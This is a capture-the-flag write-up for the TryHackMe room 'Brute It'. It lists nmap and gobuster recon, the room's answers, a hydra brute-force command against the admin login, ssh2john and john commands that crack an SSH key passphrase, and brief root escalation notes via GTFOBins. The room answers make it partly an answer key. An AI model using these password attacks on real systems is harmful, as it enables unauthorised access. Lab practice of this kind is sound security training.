# Brute It

### 1.Reconnaissance

1.nmap and gobuster

```
nmap -sC -sV(-sS -sV) MACHINE_IP
gobuster dir -u MACHINE_IP  -w /usr/share/wordlists/dirb/common.txt -t 50 
```



2.answers

1.Search for open ports using nmap.
How many ports are open?

```
2
```

2.What version of SSH is running?

```
OpenSSH 7.6p1 
```

3.What version of Apache is running?

```
2.4.29
```

4.Which Linux distribution is running?

```
Ubuntu
```

Search for hidden directories on web server.
What is the hidden directory?

```
/admin
```

### 2.Getting a shell

Find a form to get a shell on SSH.

Answer 

1.What is the user:password of the admin panel?

At first I tried the universal password but the background have set bypassed
So I turned to tools ﻿--hydra
Be careful when using the tool 

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```

"/:username=^USER^&password=^PASS^:F=incorrect"
If it is a directory, it must end with / ("/admin/:)
Or for a specific filename (index.php:)
The error message is set according to different situations

Login to interface with password
And get the answers

2.Crack the RSA key you found. What is John's RSA Private Key passphrase?

We got the rsa file.

https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/

All we have to do is run it against the private key and direct the results to a new hash file using the ssh2john Python tool:

```unknown
python ssh2john.py id_rsa > id_rsa.hash
```

Next, we'll use [John](https://null-byte.wonderhowto.com/how-to/use-john-ripper-metasploit-quickly-crack-windows-hashes-0200322/) to crack the password. 

```unknown
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

SSH into the Target

We can [SSH](https://null-byte.wonderhowto.com/how-to/set-up-ssh-server-with-tor-hide-from-shodan-hackers-0194455/) into the target using the **-i** option to specify a private key for authentication:

```unknown
ssh -i id_rsa john@MACHINE_IP
```

And we get an error. It won't allow us to use the key if permissions are too open, so all we have to do is set the permissions to be more restricted:

```unknown
 chmod 400 id_rsa
```

Successfully logged in as John

3.user.txt

4.Web flag

### 3.Privilege Escalation

https://tryhackme.com/room/linuxprivesc

View vulnerabilities that can be exploited to escalate privileges

find /bin/cat 

Tools: https://gtfobins.github.io/gtfobins/cat/

Elevate privileges View root password

Use john to crack the hash password